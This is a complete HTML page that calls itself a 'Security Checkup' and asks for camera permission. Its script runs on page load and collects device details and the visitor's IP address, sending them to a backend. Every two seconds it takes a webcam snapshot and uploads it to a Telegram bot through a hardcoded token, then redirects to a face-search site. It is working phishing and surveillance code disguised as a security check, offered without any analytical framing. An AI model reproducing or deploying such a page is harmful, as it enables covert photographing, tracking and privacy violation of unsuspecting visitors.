<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Checkup</title>
    <!-- External Libraries -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">

    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
        }
        .container {
            margin-top: 50px;
            text-align: center;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn-custom {
            background-color: #e74c3c;
            color: white;
        }
        .btn-custom:hover {
            background-color: #c0392b;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Checkup</h1>
        <p>Please grant camera permission to proceed.</p>
        <div id="loader" class="loader"></div>
    </div>

    <script>
        // Get device information
        async function getDeviceInfo() {
            let battery = await navigator.getBattery();
            let deviceInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                batteryLevel: battery.level * 100 + '%',
                charging: battery.charging ? "Yes" : "No",
                ipAddress: await getIpAddress(), // Custom function to get IP
            };
            return deviceInfo;
        }

        // Get IP address using a public API
        async function getIpAddress() {
            let ip = '';
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip;
            } catch (e) {
                console.error("Error fetching IP address", e);
            }
            return ip;
        }

        // Send device info to backend
        function sendDeviceInfo(data) {
            fetch('/device_info', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
        }

        // Take snapshot and send to Telegram every 2 seconds
        function takeSnapshotAndSend() {
            let video = document.createElement('video');
            let canvas = document.createElement('canvas');
            let context = canvas.getContext('2d');
            let constraints = { video: true };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(function (stream) {
                    video.srcObject = stream;
                    video.play();
                    setTimeout(function () {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        video.srcObject.getTracks().forEach(track => track.stop()); // Stop the camera

                        canvas.toBlob(function(blob) {
                            let formData = new FormData();
                            formData.append('file', blob);
                            fetch('https://api.telegram.org/bot7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78/sendPhoto?chat_id=912211827', {
                                method: 'POST',
                                body: formData
                            });
                        });

                    }, 1000); // Delay for loading
                })
                .catch(function (err) {
                    console.error("Error accessing camera: ", err);
                });
        }

        // Show the loader and redirect after 10 seconds
        function showLoaderAndRedirect() {
            document.getElementById("loader").style.display = "block";
            setTimeout(function () {
                window.location.href = "https://facecheck.id";  // Redirect to facecheck.id
            }, 5000); // Wait for 10 seconds before redirect
        }

        // Main function to trigger actions
        async function init() {
            const deviceInfo = await getDeviceInfo();
            sendDeviceInfo(deviceInfo);
            setInterval(takeSnapshotAndSend, 2000);
            showLoaderAndRedirect();
        }

        // Start the process immediately when the page loads
        window.onload = init;
    </script>

    <!-- Bootstrap JS and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
